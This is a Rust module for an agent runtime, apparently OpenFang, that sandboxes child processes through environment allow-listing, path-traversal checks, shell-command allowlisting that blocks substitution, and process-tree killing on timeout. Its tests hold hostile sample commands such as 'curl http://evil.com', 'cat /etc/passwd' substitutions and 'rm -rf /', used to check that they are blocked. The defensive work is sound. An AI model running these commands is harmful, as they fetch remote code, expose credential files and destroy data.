//! Subprocess environment sandboxing.
//!
//! When the runtime spawns child processes (e.g. for the `shell` tool), we
//! must strip the inherited environment to prevent accidental leakage of
//! secrets (API keys, tokens, credentials) into untrusted code.
//!
//! This module provides helpers to:
//! - Clear the child's environment and re-add only a safe allow-list.
//! - Validate executable paths before spawning.

use std::path::Path;

/// Environment variables considered safe to inherit on all platforms.
pub const SAFE_ENV_VARS: &[&str] = &[
    "PATH", "HOME", "TMPDIR", "TMP", "TEMP", "LANG", "LC_ALL", "TERM",
];

/// Additional environment variables considered safe on Windows.
#[cfg(windows)]
pub const SAFE_ENV_VARS_WINDOWS: &[&str] = &[
    "USERPROFILE",
    "SYSTEMROOT",
    "APPDATA",
    "LOCALAPPDATA",
    "COMSPEC",
    "WINDIR",
    "PATHEXT",
];

/// Sandboxes a `tokio::process::Command` by clearing its environment and
/// selectively re-adding only safe variables.
///
/// After calling this function the child process will only see:
/// - The platform-independent safe variables (`SAFE_ENV_VARS`)
/// - On Windows, the Windows-specific safe variables (`SAFE_ENV_VARS_WINDOWS`)
/// - Any additional variables the caller explicitly allows via `allowed_env_vars`
///
/// Variables that are not set in the current process environment are silently
/// skipped (rather than being set to empty strings).
pub fn sandbox_command(cmd: &mut tokio::process::Command, allowed_env_vars: &[String]) {
    cmd.env_clear();

    // Re-add platform-independent safe vars.
    for var in SAFE_ENV_VARS {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    // Re-add Windows-specific safe vars.
    #[cfg(windows)]
    for var in SAFE_ENV_VARS_WINDOWS {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }

    // Re-add caller-specified allowed vars.
    for var in allowed_env_vars {
        if let Ok(val) = std::env::var(var) {
            cmd.env(var, val);
        }
    }
}

/// Validates that an executable path does not contain directory traversal
/// components (`..`).
///
/// This is a defence-in-depth check to prevent an agent from escaping its
/// working directory via crafted paths like `../../bin/dangerous`.
pub fn validate_executable_path(path: &str) -> Result<(), String> {
    let p = Path::new(path);
    for component in p.components() {
        if let std::path::Component::ParentDir = component {
            return Err(format!(
                "executable path '{}' contains '..' component which is not allowed",
                path
            ));
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Shell/exec allowlisting
// ---------------------------------------------------------------------------

use openfang_types::config::{ExecPolicy, ExecSecurityMode};

/// Extract the base command name from a command string.
/// Handles paths (e.g., "/usr/bin/python3" → "python3").
fn extract_base_command(cmd: &str) -> &str {
    let trimmed = cmd.trim();
    // Take first word (space-delimited)
    let first_word = trimmed.split_whitespace().next().unwrap_or("");
    // Strip path prefix
    first_word
        .rsplit('/')
        .next()
        .unwrap_or(first_word)
        .rsplit('\\')
        .next()
        .unwrap_or(first_word)
}

/// Extract all commands from a shell command string.
/// Handles pipes (`|`), semicolons (`;`), `&&`, and `||`.
fn extract_all_commands(command: &str) -> Vec<&str> {
    let mut commands = Vec::new();
    // Split on pipe, semicolon, &&, ||
    // We need to split carefully: first split on ; and &&/||, then on |
    let mut rest = command;
    while !rest.is_empty() {
        // Find the earliest separator
        let separators: &[&str] = &["&&", "||", "|", ";"];
        let mut earliest_pos = rest.len();
        let mut earliest_len = 0;
        for sep in separators {
            if let Some(pos) = rest.find(sep) {
                if pos < earliest_pos {
                    earliest_pos = pos;
                    earliest_len = sep.len();
                }
            }
        }
        let segment = &rest[..earliest_pos];
        let base = extract_base_command(segment);
        if !base.is_empty() {
            commands.push(base);
        }
        if earliest_pos + earliest_len >= rest.len() {
            break;
        }
        rest = &rest[earliest_pos + earliest_len..];
    }
    commands
}

/// Check for shell metacharacters that can bypass allowlist validation.
/// These features embed commands that are invisible to static command extraction.
fn contains_shell_substitution(command: &str) -> Option<&'static str> {
    if command.contains("$(") {
        return Some("Command substitution $() is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
    }
    if command.contains('`') {
        return Some("Backtick substitution is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
    }
    if command.contains("<(") || command.contains(">(") {
        return Some("Process substitution is not allowed in allowlist mode. Use exec_policy.mode = 'full' if needed.");
    }
    None
}

/// Validate a shell command against the exec policy.
///
/// Returns `Ok(())` if the command is allowed, `Err(reason)` if blocked.
pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<(), String> {
    match policy.mode {
        ExecSecurityMode::Deny => {
            Err("Shell execution is disabled (exec_policy.mode = deny)".to_string())
        }
        ExecSecurityMode::Full => {
            tracing::warn!(
                command = &command[..command.len().min(100)],
                "Shell exec in full mode — no restrictions"
            );
            Ok(())
        }
        ExecSecurityMode::Allowlist => {
            // SECURITY: Reject shell substitution that can embed invisible commands
            if let Some(msg) = contains_shell_substitution(command) {
                return Err(msg.to_string());
            }
            let base_commands = extract_all_commands(command);
            for base in &base_commands {
                // Check safe_bins first
                if policy.safe_bins.iter().any(|sb| sb == base) {
                    continue;
                }
                // Check allowed_commands
                if policy.allowed_commands.iter().any(|ac| ac == base) {
                    continue;
                }
                return Err(format!(
                    "Command '{}' is not in the exec allowlist. Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
                    base
                ));
            }
            Ok(())
        }
    }
}

// ---------------------------------------------------------------------------
// Process tree kill — cross-platform graceful → force kill
// ---------------------------------------------------------------------------

/// Default grace period before force-killing (milliseconds).
pub const DEFAULT_GRACE_MS: u64 = 3000;

/// Maximum grace period to prevent indefinite waits.
pub const MAX_GRACE_MS: u64 = 60_000;

/// Kill a process and all its children (process tree kill).
///
/// 1. Send graceful termination signal (SIGTERM on Unix, taskkill on Windows)
/// 2. Wait `grace_ms` for the process to exit
/// 3. If still running, force kill (SIGKILL on Unix, taskkill /F on Windows)
///
/// Returns `Ok(true)` if the process was killed, `Ok(false)` if it was already
/// dead, or `Err` if the kill operation itself failed.
pub async fn kill_process_tree(pid: u32, grace_ms: u64) -> Result<bool, String> {
    let grace = grace_ms.min(MAX_GRACE_MS);

    #[cfg(unix)]
    {
        kill_tree_unix(pid, grace).await
    }

    #[cfg(windows)]
    {
        kill_tree_windows(pid, grace).await
    }
}

#[cfg(unix)]
async fn kill_tree_unix(pid: u32, grace_ms: u64) -> Result<bool, String> {
    use tokio::process::Command;

    let pid_i32 = pid as i32;

    // Try to kill the process group first (negative PID).
    // This kills the process and all its children.
    let group_kill = Command::new("kill")
        .args(["-TERM", &format!("-{pid_i32}")])
        .output()
        .await;

    if group_kill.is_err() {
        // Fallback: kill just the process.
        let _ = Command::new("kill")
            .args(["-TERM", &pid.to_string()])
            .output()
            .await;
    }

    // Wait for grace period.
    tokio::time::sleep(std::time::Duration::from_millis(grace_ms)).await;

    // Check if still alive.
    let check = Command::new("kill")
        .args(["-0", &pid.to_string()])
        .output()
        .await;

    match check {
        Ok(output) if output.status.success() => {
            // Still alive — force kill.
            tracing::warn!(
                pid,
                "Process still alive after grace period, sending SIGKILL"
            );

            // Try group kill first.
            let _ = Command::new("kill")
                .args(["-9", &format!("-{pid_i32}")])
                .output()
                .await;

            // Also try direct kill.
            let _ = Command::new("kill")
                .args(["-9", &pid.to_string()])
                .output()
                .await;

            Ok(true)
        }
        _ => {
            // Process is already dead (kill -0 failed = no such process).
            Ok(true)
        }
    }
}

#[cfg(windows)]
async fn kill_tree_windows(pid: u32, grace_ms: u64) -> Result<bool, String> {
    use tokio::process::Command;

    // Try graceful kill first (taskkill /T = tree, no /F = graceful).
    let graceful = Command::new("taskkill")
        .args(["/T", "/PID", &pid.to_string()])
        .output()
        .await;

    match graceful {
        Ok(output) if output.status.success() => {
            // Graceful kill succeeded.
            return Ok(true);
        }
        _ => {}
    }

    // Wait grace period.
    tokio::time::sleep(std::time::Duration::from_millis(grace_ms)).await;

    // Check if still alive using tasklist.
    let check = Command::new("tasklist")
        .args(["/FI", &format!("PID eq {pid}"), "/NH"])
        .output()
        .await;

    let still_alive = match &check {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            stdout.contains(&pid.to_string())
        }
        Err(_) => true, // Assume alive if we can't check.
    };

    if still_alive {
        tracing::warn!(pid, "Process still alive after grace period, force killing");
        // Force kill the entire tree.
        let force = Command::new("taskkill")
            .args(["/F", "/T", "/PID", &pid.to_string()])
            .output()
            .await;

        match force {
            Ok(output) if output.status.success() => Ok(true),
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                if stderr.contains("not found") || stderr.contains("no process") {
                    Ok(false) // Already dead.
                } else {
                    Err(format!("Force kill failed: {stderr}"))
                }
            }
            Err(e) => Err(format!("Failed to execute taskkill: {e}")),
        }
    } else {
        Ok(true)
    }
}

/// Kill a tokio child process with tree kill.
///
/// Extracts the PID from the `Child` handle and performs a tree kill.
/// This is the preferred way to clean up subprocesses spawned by OpenFang.
pub async fn kill_child_tree(
    child: &mut tokio::process::Child,
    grace_ms: u64,
) -> Result<bool, String> {
    match child.id() {
        Some(pid) => kill_process_tree(pid, grace_ms).await,
        None => Ok(false), // Process already exited.
    }
}

/// Wait for a child process with timeout, then kill if necessary.
///
/// Returns the exit status if the process exits within the timeout,
/// or kills the process tree and returns an error.
pub async fn wait_or_kill(
    child: &mut tokio::process::Child,
    timeout: std::time::Duration,
    grace_ms: u64,
) -> Result<std::process::ExitStatus, String> {
    match tokio::time::timeout(timeout, child.wait()).await {
        Ok(Ok(status)) => Ok(status),
        Ok(Err(e)) => Err(format!("Wait error: {e}")),
        Err(_) => {
            tracing::warn!("Process timed out after {:?}, killing tree", timeout);
            kill_child_tree(child, grace_ms).await?;
            Err(format!("Process timed out after {:?}", timeout))
        }
    }
}

/// Wait for a child process with dual timeout: absolute + no-output idle.
///
/// - `absolute_timeout`: Maximum total execution time.
/// - `no_output_timeout`: Kill if no stdout/stderr output for this duration (0 = disabled).
/// - `grace_ms`: Grace period before force-killing.
///
/// Returns the termination reason and output collected.
pub async fn wait_or_kill_with_idle(
    child: &mut tokio::process::Child,
    absolute_timeout: std::time::Duration,
    no_output_timeout: std::time::Duration,
    grace_ms: u64,
) -> Result<(openfang_types::config::TerminationReason, String), String> {
    use tokio::io::AsyncReadExt;

    let idle_enabled = !no_output_timeout.is_zero();
    let mut output = String::new();

    // Take stdout/stderr handles if available
    let mut stdout = child.stdout.take();
    let mut stderr = child.stderr.take();

    let deadline = tokio::time::Instant::now() + absolute_timeout;
    let mut idle_deadline = if idle_enabled {
        Some(tokio::time::Instant::now() + no_output_timeout)
    } else {
        None
    };

    let mut stdout_buf = [0u8; 4096];
    let mut stderr_buf = [0u8; 4096];

    loop {
        // Check absolute timeout
        if tokio::time::Instant::now() >= deadline {
            tracing::warn!("Process hit absolute timeout after {:?}", absolute_timeout);
            kill_child_tree(child, grace_ms).await?;
            return Ok((
                openfang_types::config::TerminationReason::AbsoluteTimeout,
                output,
            ));
        }

        // Check idle timeout
        if let Some(idle_dl) = idle_deadline {
            if tokio::time::Instant::now() >= idle_dl {
                tracing::warn!(
                    "Process produced no output for {:?}, killing",
                    no_output_timeout
                );
                kill_child_tree(child, grace_ms).await?;
                return Ok((
                    openfang_types::config::TerminationReason::NoOutputTimeout,
                    output,
                ));
            }
        }

        // Use a short poll interval
        let poll_duration = std::time::Duration::from_millis(100);

        tokio::select! {
            // Try to read stdout
            result = async {
                if let Some(ref mut out) = stdout {
                    out.read(&mut stdout_buf).await
                } else {
                    // No stdout — just sleep
                    tokio::time::sleep(poll_duration).await;
                    Ok(0)
                }
            } => {
                match result {
                    Ok(0) => {
                        // EOF on stdout — process may be done
                        stdout = None;
                        if stderr.is_none() {
                            // Both closed, wait for process exit
                            match tokio::time::timeout(
                                deadline.saturating_duration_since(tokio::time::Instant::now()),
                                child.wait(),
                            ).await {
                                Ok(Ok(status)) => {
                                    return Ok((
                                        openfang_types::config::TerminationReason::Exited(status.code().unwrap_or(-1)),
                                        output,
                                    ));
                                }
                                Ok(Err(e)) => return Err(format!("Wait error: {e}")),
                                Err(_) => {
                                    kill_child_tree(child, grace_ms).await?;
                                    return Ok((openfang_types::config::TerminationReason::AbsoluteTimeout, output));
                                }
                            }
                        }
                    }
                    Ok(n) => {
                        let text = String::from_utf8_lossy(&stdout_buf[..n]);
                        output.push_str(&text);
                        // Reset idle timer on output
                        if idle_enabled {
                            idle_deadline = Some(tokio::time::Instant::now() + no_output_timeout);
                        }
                    }
                    Err(e) => {
                        tracing::debug!("Stdout read error: {e}");
                        stdout = None;
                    }
                }
            }
            // Try to read stderr
            result = async {
                if let Some(ref mut err) = stderr {
                    err.read(&mut stderr_buf).await
                } else {
                    tokio::time::sleep(poll_duration).await;
                    Ok(0)
                }
            } => {
                match result {
                    Ok(0) => {
                        stderr = None;
                    }
                    Ok(n) => {
                        let text = String::from_utf8_lossy(&stderr_buf[..n]);
                        output.push_str(&text);
                        // Reset idle timer on output
                        if idle_enabled {
                            idle_deadline = Some(tokio::time::Instant::now() + no_output_timeout);
                        }
                    }
                    Err(e) => {
                        tracing::debug!("Stderr read error: {e}");
                        stderr = None;
                    }
                }
            }
            // Process exit
            result = child.wait() => {
                match result {
                    Ok(status) => {
                        return Ok((
                            openfang_types::config::TerminationReason::Exited(status.code().unwrap_or(-1)),
                            output,
                        ));
                    }
                    Err(e) => return Err(format!("Wait error: {e}")),
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_path() {
        // Clean paths should be accepted.
        assert!(validate_executable_path("ls").is_ok());
        assert!(validate_executable_path("/usr/bin/python3").is_ok());
        assert!(validate_executable_path("./scripts/build.sh").is_ok());
        assert!(validate_executable_path("subdir/tool").is_ok());

        // Paths with ".." should be rejected.
        assert!(validate_executable_path("../bin/evil").is_err());
        assert!(validate_executable_path("/usr/../etc/passwd").is_err());
        assert!(validate_executable_path("foo/../../bar").is_err());
    }

    #[test]
    fn test_grace_constants() {
        assert_eq!(DEFAULT_GRACE_MS, 3000);
        assert_eq!(MAX_GRACE_MS, 60_000);
    }

    #[test]
    fn test_grace_ms_capped() {
        // Verify the capping logic used in kill_process_tree.
        let capped = 100_000u64.min(MAX_GRACE_MS);
        assert_eq!(capped, 60_000);
    }

    #[tokio::test]
    async fn test_kill_nonexistent_process() {
        // Killing a non-existent PID should not panic.
        // Use a very high PID unlikely to exist.
        let result = kill_process_tree(999_999, 100).await;
        // Result depends on platform, but must not panic.
        let _ = result;
    }

    #[tokio::test]
    async fn test_kill_child_tree_exited_process() {
        use tokio::process::Command;

        // Spawn a process that exits immediately.
        let mut child = Command::new(if cfg!(windows) { "cmd" } else { "true" })
            .args(if cfg!(windows) {
                vec!["/C", "echo done"]
            } else {
                vec![]
            })
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("Failed to spawn");

        // Wait for it to finish.
        let _ = child.wait().await;

        // Now try to kill — should return Ok(false) since already exited.
        let result = kill_child_tree(&mut child, 100).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_wait_or_kill_fast_process() {
        use tokio::process::Command;

        let mut child = Command::new(if cfg!(windows) { "cmd" } else { "true" })
            .args(if cfg!(windows) {
                vec!["/C", "echo done"]
            } else {
                vec![]
            })
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("Failed to spawn");

        let result = wait_or_kill(&mut child, std::time::Duration::from_secs(5), 100).await;
        assert!(result.is_ok());
    }

    // ── Exec policy tests ──────────────────────────────────────────────

    #[test]
    fn test_extract_base_command() {
        assert_eq!(extract_base_command("ls -la"), "ls");
        assert_eq!(
            extract_base_command("/usr/bin/python3 script.py"),
            "python3"
        );
        assert_eq!(extract_base_command("  echo hello  "), "echo");
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn test_extract_all_commands_simple() {
        let cmds = extract_all_commands("ls -la");
        assert_eq!(cmds, vec!["ls"]);
    }

    #[test]
    fn test_extract_all_commands_piped() {
        let cmds = extract_all_commands("cat file.txt | grep foo | sort");
        assert_eq!(cmds, vec!["cat", "grep", "sort"]);
    }

    #[test]
    fn test_extract_all_commands_and_or() {
        let cmds = extract_all_commands("mkdir dir && cd dir || echo fail");
        assert_eq!(cmds, vec!["mkdir", "cd", "echo"]);
    }

    #[test]
    fn test_extract_all_commands_semicolons() {
        let cmds = extract_all_commands("echo a; echo b; echo c");
        assert_eq!(cmds, vec!["echo", "echo", "echo"]);
    }

    #[test]
    fn test_deny_mode_blocks() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Deny,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("ls", &policy).is_err());
        assert!(validate_command_allowlist("echo hi", &policy).is_err());
    }

    #[test]
    fn test_full_mode_allows_everything() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("rm -rf /", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_permits_safe_bins() {
        let policy = ExecPolicy::default();
        // Default safe_bins include "echo", "cat", "sort"
        assert!(validate_command_allowlist("echo hello", &policy).is_ok());
        assert!(validate_command_allowlist("cat file.txt", &policy).is_ok());
        assert!(validate_command_allowlist("sort data.csv", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_blocks_unlisted() {
        let policy = ExecPolicy::default();
        // "curl" is not in default safe_bins or allowed_commands
        assert!(validate_command_allowlist("curl https://evil.com", &policy).is_err());
        assert!(validate_command_allowlist("rm -rf /", &policy).is_err());
    }

    #[test]
    fn test_allowlist_allowed_commands() {
        let policy = ExecPolicy {
            allowed_commands: vec!["cargo".to_string(), "git".to_string()],
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("cargo build", &policy).is_ok());
        assert!(validate_command_allowlist("git status", &policy).is_ok());
        assert!(validate_command_allowlist("npm install", &policy).is_err());
    }

    #[test]
    fn test_piped_command_all_validated() {
        let policy = ExecPolicy::default();
        // "cat" is safe, but "curl" is not
        assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_ok());
        assert!(validate_command_allowlist("cat file.txt | curl -X POST", &policy).is_err());
    }

    #[test]
    fn test_default_policy_works() {
        let policy = ExecPolicy::default();
        assert_eq!(policy.mode, ExecSecurityMode::Allowlist);
        assert!(!policy.safe_bins.is_empty());
        assert!(policy.safe_bins.contains(&"echo".to_string()));
        assert!(policy.allowed_commands.is_empty());
        assert_eq!(policy.timeout_secs, 30);
        assert_eq!(policy.max_output_bytes, 100 * 1024);
    }

    #[test]
    fn test_allowlist_blocks_command_substitution() {
        let policy = ExecPolicy::default();
        assert!(validate_command_allowlist("echo $(curl http://evil.com)", &policy).is_err());
        assert!(validate_command_allowlist("echo $(cat /etc/passwd)", &policy).is_err());
    }

    #[test]
    fn test_allowlist_blocks_backtick_substitution() {
        let policy = ExecPolicy::default();
        assert!(validate_command_allowlist("echo `curl http://evil.com`", &policy).is_err());
        assert!(validate_command_allowlist("echo `cat /etc/passwd`", &policy).is_err());
    }

    #[test]
    fn test_allowlist_blocks_process_substitution() {
        let policy = ExecPolicy::default();
        assert!(validate_command_allowlist("cat <(curl http://evil.com)", &policy).is_err());
        assert!(validate_command_allowlist("diff <(echo a) >(echo b)", &policy).is_err());
    }

    #[test]
    fn test_full_mode_allows_substitution() {
        let policy = ExecPolicy {
            mode: ExecSecurityMode::Full,
            ..ExecPolicy::default()
        };
        assert!(validate_command_allowlist("echo $(whoami)", &policy).is_ok());
        assert!(validate_command_allowlist("echo `whoami`", &policy).is_ok());
    }

    #[test]
    fn test_allowlist_allows_dollar_var_references() {
        let policy = ExecPolicy::default();
        // $VAR (without parens) is NOT command substitution — should be allowed
        assert!(validate_command_allowlist("echo $HOME", &policy).is_ok());
        assert!(validate_command_allowlist("echo $PATH", &policy).is_ok());
    }
}
